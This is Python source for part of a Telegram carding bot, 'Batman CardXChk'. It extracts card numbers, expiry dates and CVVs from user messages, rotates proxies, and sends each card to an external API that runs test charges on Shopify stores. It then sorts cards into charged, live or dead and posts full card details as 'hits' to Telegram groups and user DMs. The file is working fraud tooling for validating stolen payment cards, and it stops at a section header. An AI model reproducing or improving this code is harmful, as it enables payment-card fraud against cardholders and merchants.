import asyncio
import concurrent.futures
import random
import re
import logging
import time
import threading
import string
import psycopg2.extras
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS  — taken from b3.py + progress-message spec
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# b3.py core emojis
LIVE_EMOJI_ID     = "4958610528588008305"
DECLINED_EMOJI_ID = "4956612582816351459"
CARD_EMOJI_ID     = "5800709991627232190"
USER_EMOJI_ID     = "4958689671950369798"
TIME_EMOJI_ID     = "5382194935057372936"
DEV_EMOJI_ID      = "6267091732861555879"
PRO_EMOJI_ID      = "6298678524379137990"

# b3.py hit-log emojis
HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"

# Progress-message emojis (from user spec)
PROG_GATE_EMOJI_ID     = "5341715473882955310"
PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
PROG_LIVE_EMOJI_ID     = "6267225207560214192"
PROG_DEAD_EMOJI_ID     = "4958526153955476488"
PROG_ERRORS_EMOJI_ID   = "4956611513369494230"

# Gate / button emojis (msh-specific)
GATE_EMOJI_ID          = "5801044672658805468"

# Button-specific emoji IDs (raw-dict buttons — carry style + icon)
BTN_LIVE_EMOJI_ID     = "5039793437776282663"
BTN_DEAD_EMOJI_ID     = "4956612582816351459"
BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
BTN_ALL_EMOJI_ID      = "4956324463525233747"
BTN_STOP_EMOJI_ID     = "6179444193518162239"

# Hit-log group inline button emoji
CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"

# Pool of charged emoji IDs (random one shown per charged hit)
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PLAN EMOJIS  — taken from b3.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PLAN_EMOJIS = {
    "CORE":  "5379869575338812919",
    "ELITE": "5836898273666798437",
    "ROOT":  "4956420911310832630",
    "CUSTOM": "5445027583588593750" ,
}

SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CHANNEL_LINK           = "https://t.me/Batcardchk"
HIT_LOG_GROUP_ID       = -1003999441241
EXTRA_CHARGED_GROUP_ID = -1003991915326
BUTTON_LOCK_SECONDS    = 30
API_URL                = "https://goshopi.up.railway.app/shopii"

MSH_SESSIONS  = {}
SESSION_LOCKS = {}

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PER-USER THREAD POOL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_USER_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(
    max_workers=30,
    thread_name_prefix="msh_user",
)

_MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
_MAIN_LOOP_LOCK = threading.Lock()


def _set_main_loop(loop: asyncio.AbstractEventLoop) -> None:
    global _MAIN_LOOP
    with _MAIN_LOOP_LOCK:
        if _MAIN_LOOP is None:
            _MAIN_LOOP = loop


def _tg_run(coro, timeout: float = 60):
    loop = _MAIN_LOOP
    if loop is None or loop.is_closed():
        logging.warning("[TG] Main loop not ready — dropping Telegram call")
        return None
    try:
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        return future.result(timeout=timeout)
    except concurrent.futures.TimeoutError:
        logging.warning("[TG] Telegram call timed out")
        return None
    except Exception as e:
        logging.error(f"[TG] Call failed: {e}")
        return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM RATE LIMITERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class TelegramRateLimiter:
    def __init__(self, min_interval: float = 1.0, max_burst: int = 3):
        self.min_interval      = min_interval
        self.max_burst         = max_burst
        self._last_send_time   = 0.0
        self._burst_count      = 0
        self._burst_reset_time = 0.0
        self._lock             = asyncio.Lock()

    async def wait_if_needed(self):
        async with self._lock:
            now = time.time()
            if now - self._burst_reset_time > 5.0:
                self._burst_count      = 0
                self._burst_reset_time = now
            delay = 2.0 if self._burst_count >= self.max_burst else max(0, self.min_interval - (now - self._last_send_time))
            if delay > 0:
                await asyncio.sleep(delay)
            self._last_send_time = time.time()
            self._burst_count   += 1

HIT_LOG_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
USER_DM_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
EXTRA_GROUP_RATE_LIMITER = TelegramRateLimiter(min_interval=1.0, max_burst=3)
PROGRESS_UPDATE_LIMITER  = TelegramRateLimiter(min_interval=0.5, max_burst=10)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id:  str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def safe_html(text: str) -> str:
    if not text:
        return "N/A"
    return html_escape(str(text))

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def get_plan_emoji_id(plan_name: str) -> str:
    if not plan_name:
        return PRO_EMOJI_ID
    normalized = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if normalized in PLAN_EMOJIS:
        return PLAN_EMOJIS[normalized]
    for key, eid in PLAN_EMOJIS.items():
        if key in normalized:
            return eid
    return PRO_EMOJI_ID

def build_user_link(user_obj) -> str:
    name = safe_html(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            return f"***@{parts[1]}" if len(parts) == 2 else "***"
        return (proxy[:15] + "***") if len(proxy) > 15 else "***"
    except Exception:
        return "***"

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            f.write(f"{user_id}|{username or 'None'}|{first_name or 'Unknown'}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")

async def get_user_plan_info(user_id):
    """Returns (plan_name, plan_emoji_id) — mirrors b3.py."""
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn   = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row['plan'] if row else "PREMIUM"
            plan_name = await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
            plan_name = "PREMIUM"
        plan_emoji_id = get_plan_emoji_id(plan_name)
        logging.info(f"[PLAN] User {user_id} - Raw: {plan_name} -> Emoji: {plan_emoji_id}")
        return plan_name, plan_emoji_id
    return "TRIAL", PRO_EMOJI_ID

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    return (not session) or session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    return (time.time() - session.get('start_time', 0)) < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    return max(0, int(BUTTON_LOCK_SECONDS - (time.time() - session.get('start_time', 0))) + 1)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVV', 'INCORRECT_CVV', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR', 'DO_NOT_HONOR',
        'EXPIRED_CARD', 'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL', 'TRANSACTION_NOT_ALLOWED',
        'RESTRICTED_CARD', 'CALL_ISSUER', 'MERCHANDISE_OUT_OF_STOCK',
    ]
    PROXY_ERROR_PATTERNS = [
        'connection refused', 'connection reset', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407', 'tunnel failed',
        'socks error', 'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop', 'ECONNREFUSED', 'ECONNRESET',
        'ETIMEDOUT', 'ENOTFOUND', 'proxy error', 'bad gateway',
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id  = session_id
        raw              = list(dict.fromkeys(proxies_list))
        self.all_proxies = [p for p in (self._normalize(x) for x in raw) if p]
        random.shuffle(self.all_proxies)
        self._lock       = threading.Lock()
        self._index      = 0
        self.total_uses  = 0
        logging.info(f"[ProxyManager] {len(self.all_proxies)} proxies ready for session {session_id}")

    def _normalize(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip(): return None
        proxy = proxy.strip()
        if proxy.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
            return proxy
        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'
        parts = proxy.split()
        if len(parts) == 4:
            u, p, h, port = parts
            return f'http://{u}:{p}@{h}:{port}'
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
        return f'http://{proxy}'

    def get_next_proxy(self) -> Tuple[Optional[str], bool]:
        if not self.all_proxies: return None, False
        with self._lock:
            proxy           = self.all_proxies[self._index % len(self.all_proxies)]
            self._index    += 1
            self.total_uses += 1
        return proxy, True

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        rl = (api_response or '').lower()
        for s in self.SUCCESS_RESPONSES:
            if s.lower() in rl: return False
        if '429' in rl or 'too many requests' in rl: return False
        if any(x in rl for x in ['no available products', 'not shopify', 'site requires login']): return False
        if 'step ' in rl and ('failed' in rl or 'error' in rl): return False
        if any(x in rl for x in ['receipt', 'could not extract', 'missing']): return False
        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]: return False
        if rl.strip() in ('timeout', 'timed out', 'api timeout'): return False
        for pat in self.PROXY_ERROR_PATTERNS:
            if pat in rl: return True
        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        if self.is_real_proxy_error(api_response, http_status):
            logging.debug(f"[Proxy] issue: {mask_proxy(proxy)} | {api_response[:60]}")
        else:
            logging.debug(f"[Proxy] OK: {mask_proxy(proxy)} | {api_response[:60]}")

    def get_available_count(self) -> int:
        return len(self.all_proxies)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        for match in re.findall(pattern, text):
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4: year = year[2:]
                cs = f"{card_number}|{month}|{year}|{cvv}"
                if cs not in cards:
                    cards.append(cs)
    return cards

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit(): return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9: digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def get_sites() -> List[str]:
    sites = []
    try:
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                sites = [l.strip() for l in f if l.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites or ["https://example.com"]

def load_msh_proxies() -> List[str]:
    proxies = []
    try:
        base = os.path.dirname(os.path.abspath(__file__))
        candidates = [
            os.path.join(base, "px.txt"),
            os.path.join(base, "..", "mass_gates", "px.txt"),
            "mass_gates/px.txt", "./mass_gates/px.txt",
        ]
        px_path = next((c for c in candidates if os.path.exists(c)), None)
        if px_path:
            with open(px_path, "r", encoding="utf-8", errors="ignore") as f:
                proxies = [l.strip() for l in f if l.strip() and not l.startswith(("#", ";", "//"))]
        else:
            logging.warning("[MSH] px.txt not found")
    except Exception as e:
        logging.error(f"[MSH] Error loading px.txt: {e}")
    seen, uniq = set(), []
    for p in proxies:
        if p not in seen:
            seen.add(p); uniq.append(p)
    logging.info(f"[MSH] Loaded {len(uniq)} proxies")
    return uniq

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(
    cc: str, mes: str, ano: str, cvv: str,
    site: str, proxy: str, api_url: str
) -> Tuple[bool, str, str, str, str, str, str, int]:
    import aiohttp, json as _json
    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    url = f"{api_url}?site={site}&cc={cc_formatted}&proxy={proxy}"
    http_status = None
    try:
        timeout = aiohttp.ClientTimeout(total=180)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as response:
                http_status = response.status
                if response.status == 200:
                    raw_text = await response.text()
                    try:
                        data = _json.loads(raw_text)
                    except Exception:
                        return False, "Error: Invalid JSON", site, "Shopify Payments", "0.00", "USD", "Error", http_status
                    gateway      = data.get("Gateway", "Shopify Payments")
                    price        = data.get("Price", "0.00")
                    currency     = data.get("Currency", "USD")
                    proxy_raw    = data.get("Proxy", "Dead")
                    api_response = data.get("Response", "Unknown Error")
                    status_raw   = data.get("Status", False)
                    success      = status_raw if isinstance(status_raw, bool) else str(status_raw).lower() == "true"
                    proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"
                    logging.info(f"[API] {cc[:6]}**** | {site} | {api_response}")
                    return success, api_response, site, gateway, price, currency, proxy_status, http_status
                else:
                    return False, f"API Error: HTTP {response.status}", site, "Shopify Payments", "0.00", "USD", "Error", http_status
    except asyncio.CancelledError:
        raise
    except (asyncio.TimeoutError, Exception) as e:
        msg = "timeout" if isinstance(e, asyncio.TimeoutError) else f"connection error: {str(e) or type(e).__name__}"
        return False, msg, site, "Shopify Payments", "0.00", "USD", "Dead", None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE  — plain text, no small caps
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    if result_type == "live":
        cards_list, type_label = session.get('live_cards', []),   "Live"
    elif result_type == "dead":
        cards_list, type_label = session.get('dead_cards', []),   "Dead"
    else:
        cards_list = (
            session.get('charged_cards', []) + session.get('live_cards', []) +
            session.get('dead_cards', [])    + session.get('error_cards', [])
        )
        type_label = "All"

    name = user_obj.first_name or "User"
    lines = [
        f"Gate ➳ Shopify | 0-20$",
        f"Result ➳ {type_label}",
        f"Total ➳ {len(cards_list)}",
        "━━━━━━━━━━━━━━",
    ]

    for card_data in cards_list:
        cc       = card_data.get('card', 'N/A')
        response = card_data.get('response', 'N/A')
        bin_info = card_data.get('bin_info', {})
        price    = card_data.get('price', 'N/A')
        currency = card_data.get('currency', 'USD')
        scheme   = bin_info.get('scheme', 'N/A')
        bank     = bin_info.get('bank', 'N/A')
        country  = bin_info.get('country', 'N/A')
        flag     = bin_info.get('country_emoji', '')
        country_display = f"{flag} {country}" if flag else country

        resp_upper = response.upper()
        if "CHARGED" in resp_upper or "ORDER_PAID" in resp_upper:
            status      = "Charged"
            raw_display = f"{response} | {price} {currency}"
        elif ("3DS_REQUIRED" in resp_upper or "INSUFFICIENT_FUNDS" in resp_upper
              or "INCORRECT_CVV" in resp_upper or "INCORRECT_CVC" in resp_upper
              or "INCORRECT_ZIP" in resp_upper):
            status      = "Live"
            raw_display = response
        elif any(e in response.lower() for e in [
                "timeout", "connection error", "max retries", "json decode",
                "invalid api", "unknown error", "proxy error", "site error",
                "api error", "connection reset", "could not resolve", "curl error"
            ]) or response.lower().startswith("error"):
            status      = "Error"
            raw_display = response.strip().rstrip(": ") or "Unknown Error"
        else:
            status      = "Dead"
            raw_display = response

        lines += [
            f"Card ➳ {cc}",
            f"Status ➳ {status}",
            f"Gate ➳ Shopify | 0-20$",
            f"Resp ➳ {raw_display}",
            f"Brand ➳ {scheme}",
            f"Issuer ➳ {bank}",
            f"Country ➳ {country_display}",
            f"User ➳ {name} ({plan_name})",
            "Pro ➳ Batman CardXChk",
            "━━━━━━━━━━━━━━",
        ]

    content     = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map  = {"live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename  = f"CARDXCHK_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return file_buffer, filename, len(cards_list)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG TO GROUP  — styled like checker_routes.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(
    bot: Bot, response_msg: str, result_type: str,
    user_obj, plan_name: str, price: str, currency: str
):
    await HIT_LOG_RATE_LIMITER.wait_if_needed()
    user_link     = build_user_link(user_obj)
    plan_emoji_id = get_plan_emoji_id(plan_name)
    safe_resp     = safe_html(response_msg)

    if result_type == "CHARGED":
        hit_eid    = get_random_charged_emoji()
        hit_result = "CHARGED"
    else:
        hit_eid    = LIVE_EMOJI_ID
        hit_result = "LIVE"

    caption = (
        f'<b>HIT ➛ {hit_result} <tg-emoji emoji-id="{hit_eid}">💎</tg-emoji></b>\n'
        f'<b>Gate ➛ Shopify Payments</b>\n'
        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> <code>{safe_resp}</code></b>\n'
        f'<b>User ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )

    reply_markup = {
        "inline_keyboard": [[
            {
                "text":                 "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
                "url":                  "https://t.me/Batcardchk",
                "style":                "primary",
                "icon_custom_emoji_id": CARD_CHK_BTN_EMOJI_ID,
            }
        ]]
    }

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID, text=caption,
            parse_mode="HTML", disable_web_page_preview=True,
            reply_markup=reply_markup,
        )
    except Exception as e:
        logging.error(f"[MSH] Error sending hit log: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DM TO USER  — no monospace, and reply to command in private
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_hit_dm(
    cc_formatted: str, response_msg: str, bin_data: dict,
    price: str, currency: str, elapsed_s: float,
    user_obj, plan_name: str, result_type: str
) -> str:
    """
    Builds the DM caption for Charged and Live hits.
    No monospace around the response.
    """
    bin_scheme   = bin_data.get("scheme", "N/A")
    bin_bank     = bin_data.get("bank", "N/A")
    country_name = bin_data.get("country", "N/A")
    country_flag = bin_data.get("country_emoji", "")
    bin_country  = f"{country_flag} {country_name}" if country_flag else country_name
    bin_info_str = safe_html(f"{bin_scheme} - {bin_bank} - {bin_country}")
    plan_emoji_id = get_plan_emoji_id(plan_name)
    user_link    = build_user_link(user_obj)
    dev_link     = '<a href="https://t.me/Batcardchk">Batman CardXChk</a>'
    safe_resp    = safe_html(response_msg)
    safe_price   = safe_html(price)
    safe_cur     = safe_html(currency)
    time_str     = f"{int(elapsed_s)}s" if elapsed_s < 60 else f"{int(elapsed_s//60)}m {int(elapsed_s%60)}s"

    if result_type == "CHARGED":
        charged_emoji_id = get_random_charged_emoji()
        status_line = (
            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
            f'<tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>'
        )
    else:  # LIVE
        status_line = (
            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
            f'<tg-emoji emoji-id="{LIVE_EMOJI_ID}">✅</tg-emoji></b>'
        )

    if result_type == "CHARGED":
        gate_line = f'<b>Gate ➳ Shopify | {safe_price} {safe_cur}</b>'
    else:
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'
    # Response line without monospace
    resp_line = f'<b>Resp ➳ {safe_resp}</b>'

    return (
        f'{status_line}\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{cc_formatted}</code></b>\n'
        f'{gate_line}\n'
        f'<b>──────────</b>\n'
        f'{resp_line}\n'
        f'<b>Bin ➳ <code>{bin_info_str}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_str}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )


async def send_live_dm(
    bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict,
    price: str, currency: str, elapsed_s: float, user_obj, plan_name: str
):
    await USER_DM_RATE_LIMITER.wait_if_needed()
    caption = _build_hit_dm(cc_formatted, response_msg, bin_data, price, currency,
                            elapsed_s, user_obj, plan_name, "LIVE")
    try:
        await bot.send_message(
            chat_id=user_obj.id, text=caption,
            parse_mode="HTML", disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM live hit to {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"[MSH] Error sending live DM: {e}")


async def send_charged_dm(
    bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict,
    price: str, currency: str, elapsed_s: float, user_obj, plan_name: str,
    reply_to_msg_id: Optional[int] = None, is_private: bool = False
):
    """
    Sends charged hit DM to user. If is_private is True, the message is sent as a reply
    to the original command (using reply_to_msg_id in the private chat).
    """
    caption_user = _build_hit_dm(cc_formatted, response_msg, bin_data, price, currency,
                                 elapsed_s, user_obj, plan_name, "CHARGED")
    # group version (extra charged group) – no monospace
    plan_emoji_id = get_plan_emoji_id(plan_name)
    user_link     = build_user_link(user_obj)
    charged_emoji_id = get_random_charged_emoji()
    safe_resp     = safe_html(response_msg)
    safe_price    = safe_html(price)
    safe_cur      = safe_html(currency)
    bin_scheme    = bin_data.get("scheme", "N/A")
    bin_bank      = bin_data.get("bank", "N/A")
    country_name  = bin_data.get("country", "N/A")
    country_flag  = bin_data.get("country_emoji", "")
    bin_country   = f"{country_flag} {country_name}" if country_flag else country_name
    bin_info_str  = safe_html(f"{bin_scheme} - {bin_bank} - {bin_country}")
    time_str      = f"{int(elapsed_s)}s" if elapsed_s < 60 else f"{int(elapsed_s//60)}m {int(elapsed_s%60)}s"

    caption_group = (
        f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
        f'<tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{cc_formatted}</code></b>\n'
        f'<b>Gate ➳ Shopify | {safe_price} {safe_cur}</b>\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ {safe_resp}</b>\n'  # No monospace
        f'<b>Bin ➳ <code>{bin_info_str}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_str}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )

    # Send to user's private chat
    await USER_DM_RATE_LIMITER.wait_if_needed()
    try:
        if is_private and reply_to_msg_id:
            # Reply directly to the user's command in the private chat
            await bot.send_message(
                chat_id=user_obj.id, text=caption_user,
                parse_mode="HTML", disable_web_page_preview=True,
                reply_to_message_id=reply_to_msg_id
            )
        else:
            await bot.send_message(
                chat_id=user_obj.id, text=caption_user,
                parse_mode="HTML", disable_web_page_preview=True
            )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM charged hit to {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"[MSH] Error sending charged DM: {e}")

    # Send to extra charged group (always as new message)
    await asyncio.sleep(0.5)
    await EXTRA_GROUP_RATE_LIMITER.wait_if_needed()
    try:
        await bot.send_message(
            chat_id=EXTRA_CHARGED_GROUP_ID, text=caption_group,
            parse_mode="HTML", disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"[MSH] Error sending charged to extra group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
